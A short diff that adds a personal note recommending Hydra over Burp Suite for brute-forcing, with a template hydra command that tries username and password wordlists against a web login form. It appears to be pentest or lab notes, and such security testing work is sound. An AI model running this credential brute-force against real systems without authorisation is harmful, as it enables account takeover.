@@ -1,0 +1,4 @@
+Hydra is a faster tool than burpsuite for brute force
+To use:
+
+hydra ip http-form-post "path:username=^USER^&passwd=^PASS^&submit=submit:Wrong user name or password." -L users.txt -P passwords.txt
